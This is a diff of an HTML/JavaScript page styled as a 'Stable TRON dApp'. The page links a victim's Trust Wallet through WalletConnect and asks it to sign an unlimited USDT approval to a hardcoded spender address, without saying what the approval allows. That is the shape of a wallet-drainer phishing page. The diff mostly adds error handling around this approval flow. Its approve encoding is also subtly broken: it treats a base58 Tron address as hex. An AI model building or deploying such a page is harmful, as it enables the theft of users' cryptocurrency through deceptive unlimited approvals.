@@ -14,6 +14,7 @@ button { padding:10px 14px; margin-right:10px; }
 .card { border:1px solid #ddd; padding:12px; margin-top:12px; }
 #status { font-weight:bold; margin:10px 0; }
 code { word-break:break-all; }
+#qr canvas{ width:260px; height:260px; }
 </style>
 </head>
 
@@ -42,124 +43,108 @@ code { word-break:break-all; }
 </div>
 
 <script>
-
+/* CONFIG — înlocuiește PROJECT_ID cu al tău din WalletConnect (poate fi public) */
 const PROJECT_ID = "dde98880530be70b65d01a1be59e5fa3";
-
-/* USDT TRC20 */
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-
-/* SPENDER (contractul tău / adresa ta) */
 const SPENDER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";
-
-/* MAX approval */
-const MAX_UINT256 =
-"115792089237316195423570985008687907853269984665640564039457584007913129639935";
+const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
 let client;
 let session;
-
 const status = (t)=>document.getElementById("status").innerText = t;
 
 /* INIT */
 async function init(){
-
-  client = await SignClient.init({
-    projectId: PROJECT_ID,
-    metadata: {
-      name: "Stable TRON dApp",
-      url: "https://example.com"
+  try{
+    if(!window.SignClient){
+      throw new Error("SignClient not loaded");
     }
-  });
-
-  document.getElementById("spender").innerText = SPENDER;
+    client = await SignClient.init({
+      projectId: PROJECT_ID,
+      metadata: { name: "Stable TRON dApp", url: "https://example.com" }
+    });
+    document.getElementById("spender").innerText = SPENDER;
+    console.log("init done", !!client);
+  }catch(e){
+    console.error("init error", e);
+    status("Init error: " + e.message);
+  }
 }
 
 /* QR RENDER */
 function renderQR(uri){
-  const canvas = document.createElement("canvas");
-  QRCode.toCanvas(canvas, uri, { width: 260 });
-
-  const qr = document.getElementById("qr");
-  qr.innerHTML = "";
-  qr.appendChild(canvas);
+  try{
+    const canvas = document.createElement("canvas");
+    QRCode.toCanvas(canvas, uri, { width: 260 }, function(err){
+      if(err){ console.error("qrcode error", err); status("QR error"); return; }
+    });
+    const qr = document.getElementById("qr");
+    qr.innerHTML = "";
+    qr.appendChild(canvas);
+  }catch(e){
+    console.error("renderQR error", e);
+    status("QR render error");
+  }
 }
 
-/* CONNECT (STABLE FLOW) */
+/* CONNECT */
 async function connect(){
-
-  status("Connecting wallet...");
-
-  const { uri, approval } = await client.connect({
-    requiredNamespaces: {
-      tron: {
-        methods: ["tron_sendTransaction"],
-        chains: ["tron:0"],
-        events: []
+  try{
+    status("Connecting wallet...");
+    const res = await client.connect({
+      requiredNamespaces: {
+        tron: {
+          methods: ["tron_sendTransaction"],
+          chains: ["tron:0"],
+          events: []
+        }
       }
+    });
+    console.log("connect result", res);
+    const { uri, approval } = res;
+    if(uri){
+      renderQR(uri);
+      status("Scan QR in Trust Wallet");
+    } else {
+      status("No QR → wallet may open directly");
     }
-  });
-
-  /* 🔥 QR LOGIC (REALISTIC) */
-  if (uri) {
-    renderQR(uri);
-    status("Scan QR in Trust Wallet");
-  } else {
-    status("No QR → wallet opened directly");
+    session = await approval();
+    console.log("session", session);
+    status("Connected (permissions granted)");
+    document.getElementById("approveBtn").disabled = false;
+    document.getElementById("qr").innerHTML = "";
+  }catch(e){
+    console.error("connect error", e);
+    status("Connect error: " + (e?.message || e));
   }
-
-  session = await approval();
-
-  status("Connected (permissions granted)");
-
-  document.getElementById("approveBtn").disabled = false;
-
-  document.getElementById("qr").innerHTML = "";
 }
 
 /* ENCODE APPROVE */
 function buildApproveData(){
-
   const methodId = "095ea7b3";
-
   const spender = SPENDER.replace("0x","").padStart(64,"0");
   const amount = BigInt(MAX_UINT256).toString(16).padStart(64,"0");
-
   return "0x" + methodId + spender + amount;
 }
 
 /* SEND APPROVE */
 async function approve(){
-
-  const owner = session.namespaces.tron.accounts[0].split(":")[2];
-
-  const tx = {
-    to: USDT_CONTRACT,
-    owner_address: owner,
-    data: buildApproveData(),
-    feeLimit: 10000000,
-    callValue: 0
-  };
-
-  status("Waiting wallet confirmation...");
-
-  await client.request({
-    topic: session.topic,
-    chainId: "tron:0",
-    request: {
-      method: "tron_sendTransaction",
-      params: [tx]
-    }
-  });
-
-  status("Transaction signed in wallet");
+  try{
+    const owner = session.namespaces.tron.accounts[0].split(":")[2];
+    const tx = { to: USDT_CONTRACT, owner_address: owner, data: buildApproveData(), feeLimit: 10000000, callValue: 0 };
+    status("Waiting wallet confirmation...");
+    await client.request({ topic: session.topic, chainId: "tron:0", request: { method: "tron_sendTransaction", params: [tx] } });
+    status("Transaction signed in wallet");
+  }catch(e){
+    console.error("approve error", e);
+    status("Approve error: " + (e?.message || e));
+  }
 }
 
-/* EVENTS */
 document.getElementById("connectBtn").onclick = connect;
 document.getElementById("approveBtn").onclick = approve;
 
 init();
-
 </script>
 
 </body>
